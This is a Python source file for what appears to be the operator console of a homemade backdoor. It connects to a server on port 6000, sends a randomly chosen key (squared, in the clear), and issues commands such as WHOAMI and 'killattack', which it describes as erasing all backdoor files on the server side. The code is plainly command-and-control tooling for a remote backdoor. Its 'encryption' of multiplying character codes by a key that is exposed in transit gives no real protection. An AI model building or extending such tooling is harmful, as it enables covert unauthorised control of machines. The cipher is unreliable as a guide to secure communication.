#FOR PYTHON 3
__version__ = '0.1'
import socket, random, cmd

#The encryption algorithm takes a random number and multiplies all of
#the charachter's ASCII values by it. It gets the key to the other side
#by sending it squared.
# print([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
#client = socket.socket()
'''class send_commands(cmd.Cmd):
    prompt = 'Enter command: '
    def do_exit(self, arg):
        lenofmsg = str(len(str('stop').encode()))
        lenofmsg = ('0' * (4-len(lenofmsg))) + str(lenofmsg)
        client.send(str(lenofmsg).encode())
        client.send(encode_with_key('stop', key))
        stop()
    def do_loggedin(self, arg):
        lenofmsg = str(len(str('loggedin').encode()))
        lenofmsg = ('0' * (4-len(lenofmsg))) + str(lenofmsg)
        client.send(str(lenofmsg).encode())
        client.send(encode_with_key('loggedin', key))
        lenofmsg_rtrnd = int(connect.recv(4).decode('utf-8'))
        print(str(decode_with_key(client.recv(lenofmsg_rtrnd), key)))
    def do_WHOAMI(self, arg):
        lenofmsg = str(len(str('WHOAMI').encode()))
        lenofmsg = ('0' * (4-len(lenofmsg))) + str(lenofmsg)
        client.send(str(lenofmsg).encode())
        client.send(encode_with_key('WHOAMI', key))
        lenofmsg_rtrnd = int(connect.recv(4).decode('utf-8'))
        print(str(decode_with_key(client.recv(lenofmsg_rtrnd), key)))'''

def encode_with_key(string, key):#Encrypting and decrypting
    list_of_numbers = ''
    for letter in string:
        list_of_numbers += str(ord(letter)*key) + ' '
    return list_of_numbers.encode()
def decode_with_key(byte, key):
    string_of_bytes = ''
    list_of_bytes = byte.decode('utf-8').split()
    for b in list_of_bytes:
        string_of_bytes += chr(int(int(b)//key))
    return string_of_bytes

class send_commands(cmd.Cmd):
    prompt = 'Enter command: '
    def cmdloop(self, key, client):
        self.key = key
        self.client = client
        intro = None
        return cmd.Cmd.cmdloop(self, intro)
    def do_exit(self, arg):
        'Exit program.'
        message = encode_with_key('exit', self.key)
        lenofmsg = str(len(str(message)))
        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
        self.client.send(str(lenofmsg).encode())
        self.client.send(message)
        return True
    def do_loggedin(self, arg):
        'Get current logged in user.'
        message = encode_with_key('loggedin', self.key)
        lenofmsg = str(len(message))
        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
        print('lenofmsg', lenofmsg)
        self.client.send(str(lenofmsg).encode())
        self.client.send(message)
        lenofmsg_rtrnd = int(self.client.recv(5).decode('utf-8'))
        print(str(decode_with_key(self.client.recv(lenofmsg_rtrnd), self.key)))
    def do_WHOAMI(self, arg):
        'Get current logged in user.'
        message = encode_with_key('WHOAMI', self.key)
        lenofmsg = str(len(str(message)))
        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
        print('lenofmsg', lenofmsg)
        self.client.send(str(lenofmsg).encode())
        self.client.send(message)
        lenofmsg_rtrnd = int(self.client.recv(5).decode('utf-8'))
        print(str(decode_with_key(self.client.recv(lenofmsg_rtrnd), self.key)))
    def do_killattack(self, arg):
        'Erase all backdoor files on serverside.'
        print('Are you sure you want to erase all backdoor files on the serverside?')
        erase = input('There is no going back. Write y or n. ')
        if erase == 'y':
            message = encode_with_key('killattack', self.key)
            lenofmsg = str(len(str(message)))
            lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
            print('lenofmsg', lenofmsg)
            self.client.send(str(lenofmsg).encode())
            self.client.send(message)
            return True

def main():
    #Setting up
    client = socket.socket()
    #ip = input('Server IP: ')
    #ip = '104.239.207.44'
    ip = '127.0.0.1'
    port = 6000
    try:
        client.connect((ip, port))
    except:
        print('Connection Failed')
        raise SystemExit

    key = random.randrange(0, 2**12)#Picking encryption key
    print('key', key)
    lenofmsg = str(len(str(key**2).encode()))
    lenofmsg = ('0' * (2-len(lenofmsg))) + str(lenofmsg)
    client.send(str(lenofmsg).encode())
    client.send(str(key**2).encode())#Multiplying key for security
    commands = send_commands()
    commands.cmdloop(key, client)
    client.close()

if __name__ == '__main__':
    main()
